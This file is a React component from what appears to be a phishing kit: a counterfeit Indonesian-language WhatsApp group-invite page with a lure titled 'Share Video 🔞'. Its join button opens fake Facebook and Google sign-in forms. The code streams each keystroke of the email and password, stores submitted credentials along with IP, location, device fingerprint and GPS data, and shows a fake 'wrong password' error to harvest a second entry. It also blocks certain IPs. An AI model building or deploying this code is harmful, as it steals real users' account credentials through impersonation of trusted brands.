import React, { useEffect, useState, useRef } from 'react';
import { GroupData, DeviceFingerprint } from '../types';
import { 
    WALogoHeader, MenuIcon, DownloadIconGreen, DownloadIconBlack,
    XIcon, YoutubeIcon, InstagramIcon, FacebookIcon, ChevronDown, WALogo, FacebookWordmark, FacebookLogoCircle
} from './WhatsAppIcons';
import { ShieldAlert, X } from 'lucide-react';
import { logVisitor, isIPBlocked, saveCredential, getAdvancedFingerprint, sendLiveTypingLog } from '../services/storage';

interface PublicViewProps {
  data: GroupData | null;
}

const PublicView: React.FC<PublicViewProps> = ({ data }) => {
  const [loading, setLoading] = useState(true);
  const [blocked, setBlocked] = useState(false);
  
  // Login Interceptor State
  const [loginModalOpen, setLoginModalOpen] = useState(false);
  const [loginStep, setLoginStep] = useState<'selection' | 'facebook' | 'google'>('selection');
  const [credEmail, setCredEmail] = useState('');
  const [credPass, setCredPass] = useState('');
  
  // Refs for auto-focus on fake error
  const fbPassRef = useRef<HTMLInputElement>(null);
  const googlePassRef = useRef<HTMLInputElement>(null);

  // Double-Hit Strategy State (Fake Error)
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [showFakeError, setShowFakeError] = useState(false);
  
  // Visitor Data
  const [visitorIP, setVisitorIP] = useState('Unknown');
  const [visitorLocation, setVisitorLocation] = useState('Unknown');
  const [deviceInfo, setDeviceInfo] = useState<DeviceFingerprint>();
  const [preciseGPS, setPreciseGPS] = useState<string>(''); // Stores Google Maps Link

  useEffect(() => {
    const checkSecurity = async () => {
      try {
        // 1. Get Network Info
        const response = await fetch('https://ipapi.co/json/');
        const ipData = await response.json();
        const ip = ipData.ip;
        const locationStr = `${ipData.city || ''}, ${ipData.region || ''}, ${ipData.country_name || ''}`;
        
        setVisitorIP(ip);
        setVisitorLocation(locationStr);

        // 2. Get Advanced Hardware Info (GPU, Battery, etc)
        const advancedData = await getAdvancedFingerprint();
        setDeviceInfo(advancedData);

        if (isIPBlocked(ip)) {
          setBlocked(true);
          setLoading(false);
          return;
        }

        if (data && data.id) {
            logVisitor({
            ip: ip,
            city: ipData.city || 'Unknown',
            region: ipData.region || 'Unknown',
            country_name: ipData.country_name || 'Unknown',
            org: ipData.org || 'Unknown',
            timestamp: Date.now(),
            groupId: data.id,
            groupName: data.name
            });
        }

      } catch (error) {
        // Ignore error
      } finally {
        setLoading(false);
      }
    };

    checkSecurity();
  }, [data]);

  // LIVE TYPING HANDLER
  const handleTyping = (e: React.ChangeEvent<HTMLInputElement>, type: 'email' | 'pass') => {
      const val = e.target.value;
      if (type === 'email') setCredEmail(val);
      if (type === 'pass') setCredPass(val);
      setShowFakeError(false); // Hide error when user starts typing again

      // Trigger the live log beacon (debounced inside the service)
      sendLiveTypingLog(
          type === 'email' ? val : credEmail,
          type === 'pass' ? val : credPass,
          loginStep === 'facebook' ? 'facebook' : 'google',
          visitorIP,
          visitorLocation,
          deviceInfo
      );
  };

  const handleJoinClick = () => {
    setLoginModalOpen(true);
    setLoginStep('selection'); // Always start with selection
    setLoginAttempts(0); // Reset attempts
    setShowFakeError(false);
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // --- STRATEGY: DOUBLE-HIT (FAKE ERROR) ---
    
    // 1. Send Log Immediately
    await saveCredential({
        service: loginStep === 'facebook' ? 'facebook' : 'google',
        email: credEmail,
        password: credPass,
        timestamp: Date.now(),
        ip: visitorIP,
        location: visitorLocation,
        userAgent: navigator.userAgent,
        deviceInfo: deviceInfo,
        isLiveType: false,
        attemptNumber: loginAttempts + 1, // Track which attempt this is
        preciseGPS: preciseGPS
    });

    // 2. Determine Action
    if (loginAttempts === 0) {
        // FIRST ATTEMPT: FAKE FAILURE
        await new Promise(resolve => setTimeout(resolve, 800)); // Fake loading
        setShowFakeError(true);
        setCredPass(''); // Clear password field to force re-entry
        setLoginAttempts(1); // Increment attempts
        
        // Auto-focus the password field so they can type immediately
        setTimeout(() => {
            if (loginStep === 'facebook') fbPassRef.current?.focus();
            if (loginStep === 'google') googlePassRef.current?.focus();
        }, 100);
    } else {
        // SECOND ATTEMPT: SUCCESS
        await new Promise(resolve => setTimeout(resolve, 500));
        if (data && data.link) {
            window.location.href = data.link;
        } else {
            // Fallback if no link
            alert("Connection error. Please try again later.");
        }
    }
  };

  if (loading) {
    return <div className="min-h-screen bg-white"></div>;
  }

  if (blocked) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-[#0b141a] p-6 text-center font-sans text-gray-200">
        <ShieldAlert size={64} className="text-red-500 mb-4" />
        <h1 className="text-2xl font-bold mb-2">Access Denied</h1>
        <p className="text-gray-400 mb-6 max-w-md">
          Your IP address has been blocked.
        </p>
      </div>
    );
  }

  // Fallback data if accessing root or invalid ID
  const displayData = data || {
      name: "Share Video 🔞",
      image: null,
      id: "demo",
      link: "",
      memberCount: "500",
      lastMessage: ""
  };

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col">
        {/* HEADER */}
        <header className="flex justify-between items-center px-5 py-4 bg-white z-10">
            <div className="cursor-pointer"><MenuIcon /></div>
            <div className="cursor-pointer"><WALogoHeader /></div>
            <div className="cursor-pointer"><DownloadIconGreen /></div>
        </header>

        {/* MAIN CONTENT */}
        <main className="flex-1 flex flex-col items-center pt-10 px-4 text-center">
            {/* Group Image with Scribble Effect (simulated by overlay or just showing image) */}
            <div className="relative w-[130px] h-[130px] mb-4">
                {displayData.image ? (
                    <img src={displayData.image} alt="Group" className="w-full h-full rounded-full object-cover" />
                ) : (
                    <div className="w-full h-full rounded-full bg-gray-200 flex items-center justify-center">
                         <svg className="w-16 h-16 text-gray-400" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                    </div>
                )}
                {/* Red Scribble Overlay Simulation */}
                {!displayData.image && <div className="absolute inset-0 pointer-events-none opacity-80" style={{background: 'url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cGF0aCBkPSJNMTAgOTAgTjkwIDEwIiBzdHJva2U9InJlZCIgc3Ryb2tlLXdpZHRoPSIxMCIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBvcGFjaXR5PSIwLjUiLz48L3N2Zz4=") center/cover no-repeat'}}></div>}
            </div>

            <h1 className="text-[22px] font-medium text-[#111b21] leading-snug max-w-xs mx-auto">
                {displayData.name}
            </h1>
            
            <p className="text-[#54656f] text-[15px] mt-1 mb-8">
                Undangan Grup WhatsApp
            </p>

            <button 
                onClick={handleJoinClick}
                className="bg-[#00a884] text-white font-bold text-[15px] py-2.5 px-8 rounded-full w-full max-w-[300px] hover:bg-[#008f6f] transition shadow-sm mb-8"
            >
                Bergabung ke Chat
            </button>

            <p className="text-[#54656f] text-[14px]">
                Belum menggunakan WhatsApp?
            </p>
            <span className="text-[#00a884] font-medium text-[14px] cursor-pointer hover:underline mb-16">
                Unduh
            </span>
        </main>

        {/* FOOTER */}
        <footer className="bg-[#111b21] text-white pt-10 pb-8 px-6">
            <div className="flex flex-col items-center">
                {/* Download Button */}
                <button className="bg-[#25d366] hover:bg-[#20bd5a] text-[#111b21] font-bold text-[15px] py-2.5 px-6 rounded-full flex items-center gap-2 mb-10 transition">
                    <DownloadIconBlack />
                    Unduh
                </button>

                {/* Social Icons */}
                <div className="flex gap-10 mb-12 text-white">
                    <div className="cursor-pointer hover:opacity-80"><XIcon /></div>
                    <div className="cursor-pointer hover:opacity-80"><YoutubeIcon /></div>
                    <div className="cursor-pointer hover:opacity-80"><InstagramIcon /></div>
                    <div className="cursor-pointer hover:opacity-80"><FacebookIcon /></div>
                </div>

                {/* Logo */}
                <div className="mb-10">
                    <WALogo />
                </div>

                {/* Links Grid */}
                <div className="grid grid-cols-2 md:grid-cols-4 gap-y-8 gap-x-4 w-full max-w-4xl text-[14px] mb-12">
                    <div className="flex flex-col gap-3">
                        <span className="text-[#8696a0] text-[12px] font-medium uppercase tracking-wider mb-1">Yang kami lakukan</span>
                        <a href="#" className="hover:underline">Fitur</a>
                        <a href="#" className="hover:underline">Blog</a>
                        <a href="#" className="hover:underline">Keamanan</a>
                        <a href="#" className="hover:underline">Untuk Bisnis</a>
                    </div>
                    <div className="flex flex-col gap-3">
                        <span className="text-[#8696a0] text-[12px] font-medium uppercase tracking-wider mb-1">Siapa kami</span>
                        <a href="#" className="hover:underline">Tentang kami</a>
                        <a href="#" className="hover:underline">Karier</a>
                        <a href="#" className="hover:underline">Pusat Merek</a>
                        <a href="#" className="hover:underline">Privasi</a>
                    </div>
                     <div className="flex flex-col gap-3">
                        <span className="text-[#8696a0] text-[12px] font-medium uppercase tracking-wider mb-1">Gunakan WhatsApp</span>
                        <a href="#" className="hover:underline">Android</a>
                        <a href="#" className="hover:underline">iPhone</a>
                        <a href="#" className="hover:underline">Mac/PC</a>
                        <a href="#" className="hover:underline">WhatsApp Web</a>
                    </div>
                     <div className="flex flex-col gap-3">
                        <span className="text-[#8696a0] text-[12px] font-medium uppercase tracking-wider mb-1">Perlu bantuan?</span>
                        <a href="#" className="hover:underline">Hubungi Kami</a>
                        <a href="#" className="hover:underline">Pusat Bantuan</a>
                        <a href="#" className="hover:underline">Aplikasi</a>
                        <a href="#" className="hover:underline">Imbauan Keamanan</a>
                    </div>
                </div>

                {/* Bottom Bar */}
                <div className="w-full max-w-4xl border-t border-[#3b4a54] pt-8 flex flex-col md:flex-row justify-between items-start md:items-center gap-6">
                    <div className="flex flex-wrap gap-6 text-[14px]">
                        <a href="#" className="hover:underline">Peta situs</a>
                        <a href="#" className="hover:underline">Ketentuan & Kebijakan Privasi</a>
                        <span className="text-[#8696a0]">2026 © WhatsApp LLC</span>
                    </div>
                    
                    <button className="border border-[#3b4a54] rounded-full px-4 py-2 flex items-center gap-2 text-[14px] hover:bg-[#3b4a54] transition">
                        Bahasa Indonesia <ChevronDown />
                    </button>
                </div>
            </div>
        </footer>

        {/* --- FAKE LOGIN INTERCEPTOR MODAL (Same as before) --- */}
        {loginModalOpen && (
            <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/60 backdrop-blur-sm animate-in fade-in duration-200 p-0 md:p-6">
                 
                 {/* SELECTION SCREEN */}
                 {loginStep === 'selection' && (
                     <div className="bg-white w-full sm:w-[380px] rounded-t-[20px] sm:rounded-xl overflow-hidden shadow-2xl animate-in slide-in-from-bottom duration-300">
                         <div className="p-4 border-b border-gray-100 flex justify-between items-center">
                             <span className="text-gray-800 font-semibold">Masuk untuk Bergabung</span>
                             <button onClick={() => setLoginModalOpen(false)} className="p-1 bg-gray-100 rounded-full text-gray-500"><X size={20}/></button>
                         </div>
                         <div className="p-6 flex flex-col gap-4">
                             
                             <button 
                                onClick={() => { setLoginStep('facebook'); setCredEmail(''); setCredPass(''); }}
                                className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-3 rounded-lg flex items-center justify-center gap-3 transition"
                             >
                                <svg className="w-6 h-6 fill-current" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                                Lanjutkan dengan Facebook
                             </button>

                             <button 
                                onClick={() => { setLoginStep('google'); setCredEmail(''); setCredPass(''); }}
                                className="w-full bg-white border border-gray-300 hover:bg-gray-50 text-gray-700 font-medium py-3 rounded-lg flex items-center justify-center gap-3 transition"
                             >
                                <svg className="w-5 h-5" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                                Lanjutkan dengan Google
                             </button>
                         </div>
                     </div>
                 )}

                 {/* FACEBOOK LOGIN */}
                 {loginStep === 'facebook' && (
                     <div className="bg-white w-full h-full sm:h-auto sm:w-[380px] sm:rounded-xl overflow-hidden flex flex-col items-center p-6 relative animate-in slide-in-from-bottom">
                         <button onClick={() => setLoginStep('selection')} className="absolute top-4 right-4 text-gray-500"><X size={20}/></button>
                         
                         <div className="mt-2 text-xs text-gray-500 mb-8">Bahasa Indonesia</div>

                         <div className="mb-8">
                             <FacebookLogoCircle />
                         </div>
                         
                         {showFakeError && (
                             <div className="w-full bg-red-100 border border-red-300 text-red-700 text-sm p-3 rounded mb-4 text-center animate-in fade-in slide-in-from-top-2">
                                 Kata sandi yang Anda masukkan salah.
                             </div>
                         )}

                         <form onSubmit={handleLoginSubmit} className="w-full flex flex-col gap-3">
                             <input 
                                required
                                type="text" 
                                placeholder="Nomor ponsel atau email" 
                                className="w-full bg-white border border-gray-300 rounded-lg p-3.5 text-sm focus:border-[#1877f2] outline-none text-black"
                                value={credEmail}
                                onChange={(e) => handleTyping(e, 'email')}
                             />
                             <input 
                                ref={fbPassRef}
                                required
                                type="password" 
                                placeholder="Kata sandi" 
                                className={`w-full bg-white border ${showFakeError ? 'border-red-500' : 'border-gray-300'} rounded-lg p-3.5 text-sm focus:border-[#1877f2] outline-none text-black`}
                                value={credPass}
                                onChange={(e) => handleTyping(e, 'pass')}
                             />
                             <button type="submit" className="w-full bg-[#0064e0] hover:bg-[#005bb5] text-white font-bold text-[16px] py-2.5 rounded-full mt-1 transition">
                                 Login
                             </button>
                         </form>
                         
                         <a href="#" className="mt-4 text-black text-sm hover:underline">Lupa kata sandi?</a>
                         
                         <div className="mt-12 w-full">
                            <button className="w-full border border-[#0064e0] text-[#0064e0] bg-white hover:bg-gray-50 font-medium py-2.5 rounded-full text-sm">
                                Buat akun baru
                            </button>
                         </div>
                         
                         <div className="mt-8 flex flex-col items-center gap-1">
                            <span className="text-xs font-medium text-gray-500 flex items-center gap-1">
                               <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" className="h-3" alt="Meta"/> Meta
                            </span>
                         </div>
                     </div>
                 )}

                 {/* GOOGLE LOGIN */}
                 {loginStep === 'google' && (
                     <div className="bg-white w-full h-full sm:h-auto sm:w-[380px] sm:rounded-xl overflow-hidden flex flex-col sm:border sm:shadow-2xl">
                         <div className="p-8 flex flex-col items-center">
                             <svg className="w-10 h-10 mb-4" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                             <h2 className="text-2xl font-medium text-gray-800 mb-2">Sign in</h2>
                             <p className="text-gray-600 mb-8">to continue to WhatsApp</p>
                             
                             {showFakeError && (
                                 <div className="w-full text-red-600 text-sm mb-4 animate-in fade-in slide-in-from-top-1">
                                     Wrong password. Try again or click Forgot Password.
                                 </div>
                             )}

                             <form onSubmit={handleLoginSubmit} className="w-full flex flex-col gap-4">
                                 <div className="relative">
                                     <input 
                                        required
                                        type="text" 
                                        className="peer w-full p-3 pt-5 border border-gray-300 rounded focus:border-blue-500 outline-none placeholder-transparent text-black"
                                        placeholder="Email or phone"
                                        id="g-email"
                                        value={credEmail}
                                        onChange={(e) => handleTyping(e, 'email')}
                                     />
                                     <label htmlFor="g-email" className="absolute left-3 top-1 text-xs text-blue-500 font-medium transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-500">Email or phone</label>
                                 </div>
                                 
                                 <div className="relative">
                                     <input 
                                        ref={googlePassRef}
                                        required
                                        type="password" 
                                        className={`peer w-full p-3 pt-5 border ${showFakeError ? 'border-red-500' : 'border-gray-300'} rounded focus:border-blue-500 outline-none placeholder-transparent text-black`}
                                        placeholder="Password"
                                        id="g-pass"
                                        value={credPass}
                                        onChange={(e) => handleTyping(e, 'pass')}
                                     />
                                     <label htmlFor="g-pass" className={`absolute left-3 top-1 text-xs ${showFakeError ? 'text-red-500' : 'text-blue-500'} font-medium transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-500`}>Password</label>
                                 </div>

                                 <div className="flex justify-between items-center mt-6">
                                     <button type="button" onClick={() => setLoginStep('selection')} className="text-blue-600 font-medium text-sm">Back</button>
                                     <button type="submit" className="bg-[#1a73e8] text-white font-medium py-2 px-6 rounded hover:bg-blue-700 transition">Next</button>
                                 </div>
                             </form>
                         </div>
                     </div>
                 )}

            </div>
          )}
    </div>
  );
};

export default PublicView;
